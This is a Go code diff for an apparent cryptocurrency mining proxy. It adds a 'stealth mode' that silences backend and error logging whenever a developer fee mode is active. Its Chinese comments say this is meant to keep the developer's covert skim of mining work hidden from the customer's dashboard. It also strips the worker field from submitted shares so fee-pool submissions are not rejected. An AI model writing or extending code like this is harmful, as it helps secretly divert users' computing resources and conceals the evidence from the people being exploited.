@@ -276,6 +276,15 @@ func (s *Session) LogGeneral(format string, v ...interface{}) {
 }
 
 func (s *Session) LogBackend(format string, v ...interface{}) {
+	s.mu.Lock()
+	mode := s.CurrentFeeMode
+	s.mu.Unlock()
+
+	// 隐身模式：如果是开发者的暗抽机制，绝对禁止将日志暴露给前端客户面板
+	if mode == FeeModeDev {
+		return
+	}
+
 	msg := fmt.Sprintf(format, v...)
 	if s.Config.EnableDetailedLog {
 		log.Printf("[BACKEND-FEE] [%s] %s", s.getWorkerKey(), msg)
@@ -283,6 +292,15 @@ func (s *Session) LogBackend(format string, v ...interface{}) {
 }
 
 func (s *Session) LogError(format string, v ...interface{}) {
+	s.mu.Lock()
+	mode := s.CurrentFeeMode
+	s.mu.Unlock()
+
+	// 隐身模式：开发者的暗抽哪怕遇到连接断开或超时报错，也绝对禁止抛给前端
+	if mode == FeeModeDev {
+		return
+	}
+
 	msg := fmt.Sprintf(format, v...)
 	if s.Server != nil {
 		s.Server.GetLogger(s.getWorkerKey()).AddLog(LogTypeError, msg, s.Config.EnableDetailedLog)
@@ -754,9 +772,11 @@ func (s *Session) readMinerLoop() {
 								}
 							}
 						} else if method == "eth_submitWork" {
-							// ETH Proxy doesn't send worker name in submitWork
+							// Some miners append "worker" to the JSON root in eth_submitWork.
+							// For fee pools (like F2Pool), this MUST be stripped to prevent
+							// "result: false" or "unknown job id" rejections due to worker mismatch.
+							delete(msg, "worker")
 						}
-						
 						modBytes, _ := json.Marshal(msg)
 						finalLine := string(modBytes)
 						
